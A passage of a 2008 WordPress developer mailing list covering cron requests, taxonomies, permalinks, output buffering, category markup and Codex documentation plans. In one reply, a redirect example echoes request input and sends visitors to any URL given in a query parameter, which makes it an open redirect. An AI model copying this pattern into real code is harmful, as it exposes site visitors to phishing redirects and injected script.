people on this list are by and large the most helpful and most respectful of
any developer list or forum that I can remember. That very fact means that
being a WordPress plugin developer is oh-so-much-more pleasant than being a
developer on any of a myriad of other projects.

JMTCW anyway. :-)

You could just write

Message-ID: <26218A43-24A1-41C8-B9E8-C2B25581FB88@patpro.net>

Hello,

I'm not a WP-hacker, but I hope my request will fall in good hands.

Since version 2.7, WP uses POST method to request "wp-cron.php? 
check=...". What is the point ?
My antispam filter works by denying POST method to people who fail to  
provide proper credentials. It's implemented on the server side (in  
httpd.conf). Then, the POST method is denied for wordpress or whatever  
process on the server.
I had to edit wp-includes/cron.php to replace wp_remote_post with  
wp_remote_get.
I need to get rid of every POST requests made locally, and replace  
them with GET requests.

regards,

patpro

Message-ID: <8810a71a0812250459i71ff09c7re2a0a33e737ba7e4@mail.gmail.com>

Hi there,

Sorry, i did not read all the message related to this object (custom
taxonomies) but want to share my experience as a plugin developper.

For the plugin MailPress, i created my own taxonomy (mailing lists) based on
the code of the category taxonomy.
I had to duplicate and adapt most of the code related to the taxonomy
management :

* wp-admin/categories.php
* wp-admin/edit-category-form.php
* wp-admin/includes/taxonomy.php
* wp-admin/includes/template.php
* wp-includes/category.php
* wp-includes/category-template.php

and found that creating a term with the same slug than another term in
another taxonomy can give curious results !

so i had to use wp filters such as : 'pre_term_slug', 'edit_term_slug',
'term_slug_rss', 'term_slug'.

As far as i understand,
for the next wp releases (see
http://codex.wordpress.org/Version_2.7#Features_That_Didn.27t_Make_It),
taxonomies will use the new
"MPTT<http://codex.wordpress.org/index.php?title=MPTT&action=edit>for
hierarchies"

I hope that with that new approach and a more OO development, creating a
taxonomy from scratch will become easier.

I believe that turning them off on the admin panel will make it stop
loading those, because those are pulled from the system via an AJAX
request, causing the site to then go to pull the feeds in. Without it
showing those boxes, the AJAX request never occurs, never triggering
WP to go and get the news feed.

They must be shown at least once for the panel to load, Garbage collection
is not run on rss feeds, so disabling it will just cause the database to
keep hold of a feed dated when the dashboard widget was disabled.

Yeah, but if you turn them off and then manually delete those rss_*
bits, then they won't come back unless you turn them on again.

Meh. I think it might be more worthwhile to cache the rss feeds in the
uploads directory somewhere, as files. Prevents having to transfer all
that data out of the DB every time.

Subject: [wp-hackers] Displaying date on archive pages
Message-ID: <495472CB.5020700@yahoo.com>

Does WordPress provide a tag that will let me display the date on top of 
my archives pages?

I'd like to display "Archive: December 26, 2008" or "Archive: December 
2008," where the tag would provide the date.

I'm looking for a tag similar to single_cat_title or single_tag_title, 
which I use to create headers for my categories and tags pages.

Thanks.

There might be a simpler (as in more modern) way, but I use a
combination of is_{something}() followed by a suitable call to
the_time() to set my title.

For e.g.,


<?php /* If this is a daily archive */ } if (is_day()) { ?>
<h2 class="pagetitle">Archive for <?php the_time('F jS, Y'); ?></h2>

<?php /* If this is a monthly archive */ } elseif (is_month()) { ?>
<h2 class="pagetitle">Archive for <?php the_time('F, Y'); ?></h2>

<?php /* If this is a yearly archive */ } elseif (is_year()) { ?>
<h2 class="pagetitle">Archive for <?php the_time('Y'); ?></h2>

I don't really see the point in opening a ticket without knowing  
before if this is a bug or a design feature. May be the choice of POST  
instead of GET is made in an attempt to make WordPress more "RESTFul".

But well, if nobody here knows about that, I figure I'll have to fill  
a bug report.

Message-ID: <9aa12a490812260523mdf8c716h29dbeb77bfa56630@mail.gmail.com>

I'm writing plugin, which heavily depends on the current url. It's ok
when everything is set to default and I got usual query_string uri's.
But when I switch on SEO friendly urls, my plugin stops working. Or in
other words $_SERVER['QUERY_STRING'] on which I base my switch()
syntax becomes empty. Is there any alternative for SEO friendly urls?
Maybe components of the permalink got dumped in some structure
somewhere in WP's global space? Or something else?..

Thanks, Harish.

This returns an "unexpected '}' error" for the first line.

Wish I could do more with php than write includes. Do you see an error here?

I apologise, I hastily copied and pasted it from my old theme.

Just remove the first } and add it to the end of the final elseif and it
should be OK.

Do a var_dump on the global $wp_query and see if you can use that.

Problem may be on the handle_404()
http://trac.wordpress.org/browser/trunk/wp-includes/classes.php#L436
if you don't use wp_query to manage your custom taxonomies
or if you use wp_query with others items than posts, post categories,
tags, authors
you're pretty much on your own for pretty urls

I mean, if there is a $wp_query->get_queried_object(), does it need to
be  ( is_tag() || is_category() || is_author() ) ??

Hi:

Not because it is losing ground wordpress register my users, they said:

Two weeks ago there were 50 registered users every week and since then have 
been deleting users until this moment there are only 5 subscribers

The question is:
Wordpress has a bug that causes this behavior, I tried everything and 
nothing has succeeded in solving the problem.


I would appreciate very much your help

Att.

Alberto.

Just curious, what exact value are you looking for from
$_SERVER['QUERY_STRING']?
Or more importantly, can you post the code that you are using that queries
$_SERVER['QUERY_STRING'] and explain in comments what values you are looking
for any why you need them?  If so, we might be able to give you another way
to do what you need to do.

I can see no sane reason to use POST there instead of GET. Especially
since there's 5 working GET transports, and only 3 working POST
transports.

Does it work when you switch it to GET? If so, file the bug in trac
and get it changed.

Perhaps it may be for the IE Status 122 issue with GET?

Granted it depends on how much info is being pulled with "GET" but
I've hit the error before.

Thank you for your responses.

I'm not yet acquainted with wp_query syntax. Is there some good
resource around, for me to have a look before I plunge into API
directly?

I just need some unique identifier for every page in wordpress, no
matter will it be a post, page, category, tag or any other one
possible.

Thank you for your time again.

It depends on where you're hooking in.

the wp_query vars are not loaded straight up, But if you're running on a
hook of some sort, something like this would work:


add_action('template_redirect', 'fff');
function fff() {
    $ident = md5(serialize($GLOBALS['wp_query']->query_vars));
}
Alternatively, You could base it off $_SERVER['REQUEST_URI'] which once WP
has started loading, should contain the current permalink structure (ie.
/posts/1234/blahblah-blah/) Concat that with $_SERVER['QUERY_STRING'] and
you'll have something that'll definately be unique:

$ident = md5($_SERVER['REQUEST_URI'] . $_SERVER['QUERY_STRING'])

Message-ID: <9aa12a490812262334j11f97b9dq6cac4c61cb3db719@mail.gmail.com>

Is there a plan around to bufferize the whole wordpress output, before
it actually gets echoed to a remote client? I think this gotta be
great, if one could fully manage (add/remove/alter) output before it
(headers) gets sent. Is there any API development plan in this
direction?

Ew.

Avoid buffering at all costs.

It means that the PHP script needs to finish executing before any of the
page is sent to the user, and adds some overhead.

However, Some systems automatically buffer to compress the output.

Plugins can also call any output buffer functions themselves if they wish to
use an output buffer..

I also want it to be independent of the permalink structure. I mean I
want the plugin to work despite of what structure (nice or not nice)
is selected by user. I think there's just has to be some translation
method between URIs... I know $_SERVER['REQUEST_URI'] should work, but
id will be some kind of semi-workable, I mean it will work only on
usual URIs or only on nice ones. That's my main problem.

I dont quite get your problem exactly.

$_SERVER['REQUEST_URI'] will contain the page URI when its using pretty
permalinks, And the http path when not
$_SERVER['QUERY_STRING'] will contain the page's Query args when not using
permalinks
$_SERVER['REQUEST_URI'] . $_SERVER['QUERY_STRING'] will contain a unique URL
for every page on every WP install, Is that not what you asked for?

Alternativly, You could use get_permalink() to get the current page/posts/
URI, allthough that might only work later than you're expecting, If all else
fails, you'll need to look at $GLOBALS['wp_query']->query_vars

+1 to Ew.

And it's super easy to add via a plugin anyway. Just hook in at "init" to
start it and "shutdown" to output it.

The idea came to my mind, just when I had problems with redirection on
my complicated theme. Every time I tried to redirect I got that
'headers already sent' thing and no redirection. Probably one has to
write some separate redirection plugin to manage this problem on
earlier stage - perhaps somewhere at 'init' level.

Is the overhead so big to leave this feature alone. Could be handy
sometimes. Imagine - at any time you have all the output, that is
going to be sent to users browser, at your finger tips. We could write
some good management parser functions, that could easily rearrange
things in output. No? :)

Just realized what you have meant by adding it via plugin. Wow. So
easy. Gotta try it.

Sounds like you are going at the problem in the completely wrong 
direction. Your issue isn't that the output isn't buffered and needs to 
be; rather, your issue is that you've latched into an action that is 
after the headers have been sent.

That problem was just a trigger of an idea and it's benefits. Anyway,
do you have some solution for my problem? I mean, let's say you have
theme that catches form submition and tries to redirect the user to
the proper page. How would you solve this task? It is quiet possible
that it is easy also and I just miss the point.

Yea, just as I thought. What keeps me from adding action handler right
into the template?!.. Nothing. Ouch...

No, adding to template won't work. It probably has to be functions.php... Hmm.

To answer your original hackers question: No, WordPress has no plans to 
buffer the output, it had too many support issues and was removed. It is 
easier to build a plugin or in most cases compress the output on the server.

Good luck on the implementation.

This is an example of code that you can put in your theme's 
functions.php file that will show how you can do a redirection:

    add_action( 'init' , 'my_custom_redirect', -10 );

    function my_custom_redirect() {
        print_r( $_REQUEST['my_custom_redirect'] );
        if ( ! empty( $_REQUEST['my_custom_redirect'] ) ) {
            wp_redirect( $_REQUEST['my_custom_redirect'] );
            exit();
        }
    }

You can see an example of this working on my test site by going here: 
http://new.gaarai.com/?my_custom_redirect=http://google.com.

It's not fancy and will most likely need to be modified to match what 
you are needing, but it should be good enough to get you going in the 
right direction.

Subject: [wp-hackers] Codex function page proposal
Message-ID: <49569416.8000206@gaarai.com>

I've spent the past couple of days working on a new style for the 
function pages on the Codex. I did a lot of research on different 
documentation sites. Eventually, I found that the PHP Function Reference 
<http://us2.php.net/manual/en/funcref.php>, has what I consider the most 
straightforward, intuitive function documentation style.

In order to see how the PHP style would work on the Codex, I created a 
new function reference rough draft to try it out. My results can be 
found here <http://codex.wordpress.org/User:Chrisbliss18/wp_cache_add> 
(http://codex.wordpress.org/User:Chrisbliss18/wp_cache_add).

For those that don't know why I'm doing this, I'm trying to get a 
standard format that can be used for all functions in order to make 
using the Codex more consistent and creating/editing pages quicker and 
easier.

With that in mind, I'd like to get feedback on what everyone thinks 
about this format.

What do you like and dislike about it?
Would this format make using the Codex easier or more difficult?
Would this format make adding/editing the Codex easier or more difficult?

I think it's great, I'm a big fan of the php function reference, it's
very consistent and easy to find what you're looking for.
Your example looks good, barring some aesthetic issues (the TOC is
awkwardly-placed), but those aren't really a big deal.

Thanks for the feedback Daniel. I tried finding a better place to put 
the TOC, but there just isn't much control on how that works. The best 
that I could do was force it just below the function description.

You might want to post this to the Doc list too (so I've cc'd that list).

I personally like your new style better than the current style. It 
annoys me all the time to have to scroll to the bottom to find the 
argument list, the way some of the current pages have been organized.

But if you are planning on using this for the functions known as 
"Template Tags", you will need to get some feedback from less 
technically-oriented viewers than the typical person on the Hackers 
list. I think the way those pages are organized (with examples first and 
the args way at the bottom) was chosen to avoid intimidating themers who 
are just trying to do a little more with their themes but might not be 
PHP or programming experts.

So what I am trying to say is I think your style idea is great for a 
programmer. :)   But we need to make sure to accomodate other audiences 
for "template tag" functions.

Regards,
    Jennifer

Whatever style is chosen, consider abstracting it into a wiki
template. Make it simpler to convert things to it.

Sounds interesting Otto. Do you have any pages that I can look at that 
show me how to create them and what type of flexibility I can offer with 
them?

Wiki templating is a somewhat complex beast, but simple templates
aren't too hard. Basically, you make a Template:Whatever page, with
special syntax to substitute named values. Then, to use it, you use
the {{Whatever | param1=value1 | param2=value2 }} syntax in a page.

Best reference I know of is here: http://en.wikipedia.org/wiki/Help:Template

Why not just remove the TOC altogether with __NOTOC__ ? There's not
really any need for it, as they are smaller pages. Either that, or put
it before the description with the __TOC__ keyword.

Great job Chris, I really like it. Two Thumbs up!

As for Jennifer's comments about the Template Tag audience, it occurs to me
that what we probably really need are two sets of documentation; one for
programmers and one for designers with cross-reference links.  I think if we
try to optimize for designers or for programmers it will fail the other, and
if we try to serve both with the same documentation, we'll serve neither
group well.  Thoughts?

Subject: [wp-hackers] Some feeds will not display
Message-ID: <4956D014.30905@yahoo.com>

I've been unable to get WordPress to display any feeds other than RSS, 
FeedBurner and comments.

RSS2, Atom, main feed (mysite.com/feed) and categories feeds show a 
blank screen in Firefox and a "The page can not be displayed" message in IE.

I've disabled my FeedBurner redirect plugin, but can't think of any 
other settings that may be affecting my feeds.

Here's what I've got in header.php:

    <link rel="alternate" type="application/rss+xml" title="RSS" 
href="http://feeds.feedburner.com/MyFeed" />
    <link rel="alternate" type="application/rss+xml" title="RSS 2.0" 
href="<?php bloginfo('rss2_url'); ?>" />
    <link rel="alternate" type="text/xml" title="RSS .92" href="<?php 
bloginfo('rss_url'); ?>" />
    <link rel="alternate" type="application/atom+xml" title="Atom 0.3" 
href="<?php bloginfo('atom_url'); ?>" />
    <link rel="alternate" type="application/rss+xml" title="RSS" 
href="<?php bloginfo('comments_rss2_url'); ?>" />
    <link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />

Any suggestions?

Thanks.

Message-ID: <b4dd281c0812271726w718bb87bgefd17389f6397e6d@mail.gmail.com>

Hi all:

I've been working on a category plugin for a client.  I would have thought
something like it would exist but couldn't find one so I'm building it
myself.

However, I've run into several annoying issues with using *
wp_list_categories()* which I'd far prefer to use than to code all the SQL
myself (not because I don't have the skills but because I'd rather use a
core WP function for future compatibility.) Let me provide a output snippet
from the site I'm working on (I removed titles from <a> tags and removed the
domain from the <a> @href attribute to make it easier to understand the
HTML, and I reformatted):

<li class="cat-item cat-item-186">
    <a href="/category/human-rights/">Human Rights</a> (428)
    <ul class='children'>
        <li class="cat-item cat-item-52"><a
href="/category/human-rights/civil-rights/">Civil Rights</a> (255)</li>
        <li class="cat-item cat-item-53"><a
href="/category/human-rights/freedom-of-speech/">Freedom of Speech</a>
(174)</li>
        <li class="cat-item cat-item-55"><a
href="/category/human-rights/democracy/">Democracy</a> (110)</li>
        <li class="cat-item cat-item-72"><a
href="/category/human-rights/censorship/">Censorship</a> (110)</li>
    </ul>
</li>
<li class="cat-item cat-item-521">
    <a href="/category/fun-recreation/">Fun and Recreation</a> (104)
    <ul class='children'>
        <li class="cat-item cat-item-56"><a
href="/category/fun-recreation/funny-news/">Funny News</a> (41)</li>
        <li class="cat-item cat-item-117"><a
href="/category/fun-recreation/humor/">Humor</a> (35)</li>
        <li class="cat-item cat-item-138"><a
href="/category/fun-recreation/fun-stuff/">Fun Stuff</a> (34)</li>
        <li class="cat-item cat-item-63"><a
href="/category/fun-recreation/satire/">Satire</a> (25)</li>
    </ul>
</li>


The first issue is with how it organizes it's HTML.  Although I would
logically prefer having the <li> elements enclose <ul ="children"> elements
it makes it hard to clumsy to target with CSS and jQuery (i.e. using
"li:hover" ends up highlighting everything, including children) and it makes
it hard to appropriate place background images using "background:url(...)"
Neither "background-position:left top;" nor "background-position:left
center;" work well for icons that otherwise work well on a single-line <li>.


So here's what I'd like to see instead:

<li class="cat-item cat-item-186">
    <a href="/category/human-rights/">Human Rights</a> (428)
</li>
<ul class='children'>
        <li class="cat-item cat-item-52"><a
href="/category/human-rights/civil-rights/">Civil Rights</a> (255)</li>
        <li class="cat-item cat-item-53"><a
href="/category/human-rights/freedom-of-speech/">Freedom of Speech</a>
(174)</li>
        <li class="cat-item cat-item-55"><a
href="/category/human-rights/democracy/">Democracy</a> (110)</li>
        <li class="cat-item cat-item-72"><a
href="/category/human-rights/censorship/">Censorship</a> (110)</li>
</ul>
<li class="cat-item cat-item-521">
    <a href="/category/fun-recreation/">Fun and Recreation</a> (104)
</li>
<ul class='children'>
        <li class="cat-item cat-item-56"><a
href="/category/fun-recreation/funny-news/">Funny News</a> (41)</li>
        <li class="cat-item cat-item-117"><a
href="/category/fun-recreation/humor/">Humor</a> (35)</li>
        <li class="cat-item cat-item-138"><a
href="/category/fun-recreation/fun-stuff/">Fun Stuff</a> (34)</li>
        <li class="cat-item cat-item-63"><a
href="/category/fun-recreation/satire/">Satire</a> (25)</li>
</ul>

Of course that could cause all kinds of backward compatibility issues should
it should be triggered by a new parameter, maybe "*li_contains_ul*?"

In addition, this would almost require that the <ul> be given a class that
identifies the parent category ID, maybe "*cat-child-{nnn}*", like so:

<li class="cat-item cat-item-186">
    <a href="/category/human-rights/">Human Rights</a> (428)
</li>
<ul class='children *cat-child-186*'>
        <li class="cat-item cat-item-52"><a
href="/category/human-rights/civil-rights/">Civil Rights</a> (255)</li>
        <li class="cat-item cat-item-53"><a
href="/category/human-rights/freedom-of-speech/">Freedom of Speech</a>
(174)</li>
        <li class="cat-item cat-item-55"><a
href="/category/human-rights/democracy/">Democracy</a> (110)</li>
        <li class="cat-item cat-item-72"><a
href="/category/human-rights/censorship/">Censorship</a> (110)</li>
</ul>
<li class="cat-item cat-item-521">
    <a href="/category/fun-recreation/">Fun and Recreation</a> (104)
</li>
<ul class='children *cat-child-521*'>
        <li class="cat-item cat-item-56"><a
href="/category/fun-recreation/funny-news/">Funny News</a> (41)</li>
        <li class="cat-item cat-item-117"><a
href="/category/fun-recreation/humor/">Humor</a> (35)</li>
        <li class="cat-item cat-item-138"><a
href="/category/fun-recreation/fun-stuff/">Fun Stuff</a> (34)</li>
        <li class="cat-item cat-item-63"><a
href="/category/fun-recreation/satire/">Satire</a> (25)</li>
</ul>

I don't see any backward compatibility issues with adding that class so I
wouldn't see a need to enable with a parameter, even with old style markup
so I would just add in.

On another note, is there any reason to have absolute links and include the
full domain in the <a> href?  For a long list of categories it adds
unneccesary output.  What about an "*omit_domain*" parameter?

The last two items are 1.) it would really be nice to be able to get the
list of categories as an array as opposed to as HTML (parameter "*as_array*?"),
and 2.) why is there no equivalent wp_list_tags()?

I'd be happy to do the work to add these options assuming you guys agree
with the concept(s) and would recommend it for inclusion in 2.8.   Let me
know...

The fact is the Codex is for everyone. For the developers there is the  
phpDocs but the codex IMHO should have a discription, a Typical  
example, all the peramitres with an sample code, default, output  
sample, and version the perametre was added if different from the  
function.

First up, Absolute URL's: They're all generated by get_permalink() Theres a
filter on that i believe, So if you wish to remove the domain from such
links, you can easily do so

Secondly, Nested lists, The <ul> -has- to be within a <li> for it to be
valid HTML, It can either be <li><a>...</a><ul class="children" or
<li><a>..</a></li><li><ul class=children> but that causes issues with
numbered lists or for that matter, any list which has any form of bullet or
marker before it..

you could use li:hover{} in combination with li:hover ul{} to work around it
I guess,

Also, A CSS class such as cat-child-xxxxx would be rather pointless, It
describes the content, but does nothing to arrange it visually, and since
it'll be different in every case, its near impossible to rely on it.

I really cant see a reason why single vs multi line li's is going to make a
difference to backgrounds either.. It nearly sounds like you're assuming
that the HTML is different than from what it is or something.. i'm not
sure..

Agreed, but not every page needs to be for every person. Therein lies

I want you guys to pay attention, because this is most likely going to 
be a long post and skipping parts will lose information. I would say, it 
is a really bad idea, because I know so, but that argument doesn't work 
with children, so I doubt it would work with adults.

The problem with function documentation on the codex is even worse than 
having it in the source code. At least in the source code, there is a 
chance, albeit a slim one that the documentation will be updated when a 
change is made. That is problem, most patches I've seen don't bother 
updating the comments when the comments should be updated. What makes 
you think they are going to take the time to update the codex page either?

You are duplicating efforts. I have committed to keeping the inline 
documentation updated, I'm sure as hell not going to duplicate my 
efforts for the codex as well. I figure it will take merely a week 
before a release, to check to make sure that the documentation is 
complete, that any new functions has documentation, and go through and 
check and tighten up old documentation. I'm going to extend that time 
further by updating the codex as well.

Having the documentation on the codex was good, when inline 
documentation was sparse and the function reference didn't exist 
(http://phpdoc.wordpress.org/trunk/) I will suggest you link to that for 
the parameters, return types, and other information already contained in 
the function documentation site.

I would rather see more of http://codex.wordpress.org/Shortcode_API type 
pages. Function reference pages are only good when you know what you are 
searching for. You have to know that the function exists, before you can 
go to it. It is to remind you of information you already know or to give 
you more information that doesn't exist elsewhere. It is meant for 
programmers, but it is useless to programmers without some companion to 
let them know they should be looking for it.

The reason the PHP function reference works, so well, is that it is 
written in DocBook and contains codex type information, as well as 
function reference type information. There isn't a function reference 
for PHP, nor is there a codex (like WordPress has) for PHP. PHP just has 
both in one. They don't duplicate efforts, because everyone's effort is 
in the DocBook. Therefore, if there is a change, they just do so in one 
place.

Whereas for WordPress, you have two places, you already have the 
function reference. Therefore, the parameters, return types, and other 
miscellaneous function relevant information is known there. For the 
Codex, I would rather like to see more examples. There is a reason I 
didn't put examples in the inline documentation, I knew the codex was 
the best place to put it. It is a place that has many contributors, can 
easily be updated, and examples don't need to be changed or updated 
often. If examples need to be updated, then a regression has occurred 
and it is a defect that needs to be fixed or documented and the example 
corrected.

I figured that the best place to have documentation about parameters, 
return types, and other information specific to the function was inline 
to the function. I figured the best place to have the examples was in 
the Codex. The reason there are sometimes examples in the inline 
documentation is that there wasn't a codex page for the function or it 
was someone else who thought it would be a good idea.

No, the codex should have more pages like the Shortcode API Codex page. 
Actually, there shouldn't really be very many function specific pages 
either. It was my hope that the focus would be more on the layman 
descriptions explaining the functions and examples on how to use the 
functions than on parameters and return types.

I am not much of a writer, I've tried to do this before and it is 
terribly boring to me. I haven't even wrote the HTTP API Codex page 
either. Really that is my fault, but I mean it isn't that difficult, or 
at least it isn't to me.

I've leave you with this gem. If you are not ready to babysit the Codex 
parameter and return type information, then no one else is. If you think 
for a moment that you will leave the community or abandon the Codex 
effort, then don't do it. I think the reason you are doing it, is 
because you think programmers pay more attention to the Function 
Reference and I'll tell you that they don't. Programmers need good, well 
written Codex style documentation as well, no matter the skill level.

The problem is always that function reference lacks context, which 
examples provide, however what provides an even greater context is how 
other functions go together. In this well, you establish a relationship 
and make other functions related to the one known to the developer and 
designer.

I'll say that Designers need to have some programmer knowledge, so if 
they are scared by a little function or whatnot, then they should hire 
someone like me, who knows WTF he is doing! That said, any person should 
understand the concepts given in an example and explained in detail. 
Unless they wish to not understand and in that case, dressing the 
verbiage in "designer friendly" terms doesn't seem acceptable to me. 
Then again, I'm an asshole, so WTF do I care?

Good stuff Jacob. This is the kind of information I need.

Since I had no idea of the scope of what you are doing with the inline 
documentation until I read this, I'm sure that many other people share 
the same lack understanding on what is going on with that. Quite 
frankly, I could count on my fingers the number of days that I even knew 
of the existence of phpdoc.wordpress.org.

So, we have a huge problem, and I think that the problem is even bigger 
than I previously thought.

Here is what we have currently:

    * The Codex
          o Observations
                + Changes can be made by anyone
                + Creates a wealth of information
          o Strengths
                + Can find just references to just about anything a
                  developer would like to work with
                + Includes function references, API references, and
                  general help documents
                + Is often cited and thought of as the location to get
                  WordPress documentation
                + Can be modified at any time
          o Weaknesses
                + The organization is poor at best. Everything is in a
                  mesh that is poorly linked. It's not difficult to find
                  more than one page with similar content that are
                  linked in completely different ways
                + Search is next to worthless
                + Much of the information is either severely out of
                  date, incorrect, or lacks quality examples of use
                + Impossible to track staleness of content
    * The PHPdoc Site
          o Observations
                + Changes can only be made by coders with commit access
                  to core
          o Strengths
                + Comprehensive list of every documented function and
                  class in WP Core
                + Provides details that are helpful to coders
                + More consistent and accurate information by comparison
                  to the Codex
          o Weaknesses
                + Not nearly as well known as the Codex
                + The changes only occur when committed (this creates an
                  inability to update documentation on tagged versions)
                + Has formatting issues (such as the presentation of
                  query-style parameter options)
                + More limited scope when compared to Codex due to
                  smaller number of editors

It's clear to see that we have two systems that each have their merits. 
My concept was limited in that it attempted to address the shortcomings 
of the Codex without regards to the existence of the PHPdoc.

I'm going to shelve my Codex ideas and plans for now. What we need to do 
is discuss what the ideal solution for documentation is and then begin 
implementing that. In other words, I now see that the problem isn't just 
the Codex, it's the fact that there isn't a plan.

So, I don't know what needs to happen to create this plan and begin 
executing it, but I would definitely like to be a part of it. What most 
likely needs to occur is a number of us that are interested in fixing 
the current state of WP documentation discuss ideas back and forth until 
we come up with a vision of what WP documentation should be and then 
create a plan to make that a reality.

Most likely, this will have to be taken over to the wp-docs site. I'm 
sending this to the wp-hackers group since it started here, and I want 
to get as many developers/designers in on this as possible.

Thoughts?

Changes are not made by coders with commit access for PHPdoc. Anyone can 
create a patch on trac.wordpress.org to update, add, or replace the 
inline documentation. The design of the phpdoc site can be changed to 
that of the PHP site.

I don't want to prevent work being done on the Codex to move this 
foward, my contention is just the parameter and return type. If you 
remove those then it should be fine with a link to the trunk phpdoc, 
since it will be up-to-date version.

I would put more effort into the Codex, but like I said, it is extremely 
boring and time consuming. Most pages take at least four hours and I 
just don't have the time for that. Well, I do, but I'll rather spend it 
doing something else.

The plan most likely will be from whoever puts for the effort and time 
to accomplish the task. Hashing out details is too time consuming and 
completely depressing. Trust me, with documentation, planning amounts to 
not doing and not doing equals to it never getting done. Only with 
putting one step forward will this be accomplished.

I'll be walking beside you as will others, I believe, but I'm not going 
to be there at the beginning or even the middle. I don't expect others 
will be there with you either. However, setting a standard for which 
others can look at and parrot will do the Codex community a lot of good.

Just keep the parameter and return types out of it.

I don't like working without a plan, but if that's the best I can hope 
for, I guess that will have to suffice.

I've removed the parameter, return, and error sections from my example page.

When I link directly to the function in the PHPdoc, it of course only 
links to the inner-most frame. Is there/could there be a way to link to 
the full PHPdoc site while having that internal frame show the desired 
function?

Please give me a tap on the shoulder when you've got ideas.

Ah, good point.  I wasn't even thinking about that aspect.

describes the content, but does nothing to arrange it visually, and since
it'll be different in every case, its near impossible to rely on it.

Yes, agreed, it is pointless when you think in terms of CSS. However, when
you think in terms of jQuery and it makes a lot more sense. Being able to
inspect the current element to select another element is easier and more
robust than traversing siblings and making potentially assumptions that may
not always be valid. Of course it becomes less important in this context if
the <ul>s stay children of the <li>s.

>> I really cant see a reason why single vs multi line li's is going to make

Here again, you had a good point and all because I was doing something
stupid.  I was using background-image instead of list-image-style.  Why?
Because the code I was writing was actually code I was modifying that
someone else originally wrote.  But that's not a good excuse for my
stupidity.  Can I instead use the fact I really hate dealing with CSS and
thus don't know it very well as my excuse? :-)

Anyway, thanks for checking my (in hindsight) hasty proposal.

-Mike
P.S. I guess I can (should) use get_categories() instead to get the list of
categories as an array.  It's not structured as I wanted but that shouldn't
be hard to fix.

Very interesting discussion here. Personally I had a very hard time
starting with WordPress API and I can't say that Codex helped in that,
sometimes it took me to wrong places, sometimes it still does. I never
knew about the http://phpdoc.wordpress.org/trunk/. That's great thank
you. It's much more easier then browse an API in search of comments.

But I still think that the whole thing is little misleading. One can
become experienced PHP coder without entering the API directly. I
don't think that everyone has enough motivation and courage to do so
anyway. But in WordPress world it's kinda - 'you just have to do it'.
There seems no other way to really understand what exactly is
happening and why.

I think, that documentation must be one and it has to be automated, at
least at code comments level. Why not move to PHP-like documentation
style, but - leave a space for user contiributed descriptions and
examples. We can do it on the same page. For example, there will be
only phpdoc version of function description, until someone decides to
contribute additional information. And let it be added underneath the
phpdoc piece and let it be denoted that is is USER CONTRIBUTED and
that you guys at WordPress core are not responsible for what is
written down there ('cause it's really is not self-explanatory).

So there can be two parts on every page - phpdoc one which will be
updated automatically when patch will be done, and user contributed
wiki. And there can be a third one - comments (raw ideas - people post
comments easily, I mean working on wiki needs some kind of
preparation, and posting a comment does not). Someone more skilled in
writing may take those comments later and comile good wiki part out of
them.

I think that's the best structure. I would use it with great relieve I
should say.

I agree that something beyond PHPdoc is necessary, and that Wiki-style is
definitely the way to go, but I think more automation is needed.

Ideally, I'd love to see a bot that goes through and creates wiki pages for
all (or a subset of) functions with at the very least a link to the PHPdoc,
and then monitors the PHPdoc and, if it changes, sticks a "potentially out
of date" notice on the page, along with a category to the same effect.  The
perks of this are twofold:

1) A place for examples and quirks for each function that at least tells you
when it's out of date
2) Every release, all someone has to do is look at the "potentially out of
date" category and see what's changed.

For those who think that we don't need a function doc beyond PHPdoc, I'll
give you my use case.  I have a plugin that encourages adding a slice of
code into one's theme.  I provide copy-and-paste style code samples, but I'd
also like to provide links to documentation on more advanced functionality.
I don't want to link to PHPdoc because I find it's intimidating for all but
experienced coders.  I'd like to have something at least a little more
user-friendly.

When I first started hacking on PHP, inviting documentation was key to me
learning the language.  Without as easy and intuitive a documentation as
that found on php.net, I would have been a lot more lost.

Thanks for adding your thoughts Brian and Dave. I've been pondering the 
same things, but I wanted to see if anyone else was thinking along these 
lines.

While a merging by links between PHPdoc and the Codex may be the best 
solution with everything being the way it is, I wonder why we shouldn't 
just go "back to the drawing board" and think about a way to do this 
better. I believe that we (Brian, Dave, and myself) all agree that 
having a single repository of information in a consistent format is of 
far greater value than two cross-linked systems with different formats, 
different content, and different target audiences.

That said, Jacob said that the PHPdoc output could be modified. I'd like 
to request more information about that from Jacob before I start 
dreaming up solutions for the Codex again.

    * Does the output use a template system allowing the output to look
      like anything?
    * Do you know of any consistency issues with the inline
      documentation as it is now? In other words, has there been a way
      to ensure that all changes to the inline documentation are in the
      same consistent format?
    * What is the current state of the inline documentation format? Is
      the current format of the inline documentation exactly what you
      intended, or is it a work in process which needs more work to
      fully implement what you desire for it to have? I'm not asking
      about depth of content, I'm only asking about the format of the
      content.
    * What can we do to help you get the PHPdoc to an ideal state?

Dear: 

Every week I lost my subscribers. 

There is a problem with version 2.7?, 60 subscribers, now I have only 5. I find it strange that users are lost, there are some BUG?.+

Each week, users are automatically deleted regardless of its category (subscriber, editor, administrator), please if anyone knows how to fix the problem would be very grateful.

Message-ID: <349fe48b0812281223m5d7f1fa9h333148401211a0c9@mail.gmail.com>

I'm developing a photoblog using WordPress and I have succesfully changed
the author base from "author" to something else using this code:

add_action('init', 'replace_author_base');
function replace_author_base() {
        global $wp_rewrite;

        $wp_rewrite->author_base = 'photographer';
        $wp_rewrite->flush_rules();
}

Having the permalink structure set to "/images/%post_id%", i get this sort
of URL for author pages:

http://example.com/images/photographer/name

My question is: How could I make the /images/ part apear only for single
posts and not for category or tag or author pages?

Scribu:

Here is some code that I wrote to reconfigure permalinks for a specific
client's site, maybe you can find something of use in here?  You might want
to conditionally run some of the following code depending on what is the
current URL?


$wp_rewrite->set_permalink_structure(str_replace('/blog/','/',$wp_rewrite->permalink_structure));
    $wp_rewrite->front = '/';

    $wp_rewrite->author_base = 'authors';
    $wp_rewrite->author_structure = '/authors/%author%';

    $wp_rewrite->tag_base = 'tags';
    $wp_rewrite->tag_structure = '/tags/%tag%';

    $wp_rewrite->category_base = 'categories';
    $wp_rewrite->category_structure = '/categories/%category%';

BTW, I've been meaning to post about the patchwork that is WordPress'
permalink handling to see if it could be improved in future versions. As it
is, it is a set of complex rules that are very hard to get right, and AFAIKT
there is no good way to create an override to load a page that isn't like
the rest of the pages that are already baked into the framework.  Would
there be any will on this list to entertain improvement in permalinks?

The problem with that is that it removes the /blog/ part completely
(right?), and I need the posts to keep it.

I obviously can't use is_single()  and there isn't any
$wp_rewrite->post_structure either.

I figured it out.

This is what I use for categories:

